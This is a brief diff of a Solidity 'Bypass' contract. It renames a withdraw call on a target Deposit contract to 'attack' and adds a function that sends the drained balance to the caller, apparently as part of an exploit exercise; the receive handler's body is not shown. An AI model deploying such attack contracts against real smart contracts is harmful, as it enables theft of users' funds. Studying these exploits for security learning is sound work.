@@ -10,12 +10,16 @@ contract Bypass {
         depos = Deposit(_addr);
     }
 
-    function withdraw(uint _amount) public {
+    function attack(uint _amount) public {
         depos.withdraw(_amount);
     }
 
     function getBalance() public view returns (uint) {
         return address(this).balance;
+    }
+
+    function getFunds() public {
+        msg.sender.transfer(address(this).balance);
     }
 
     receive() external payable{
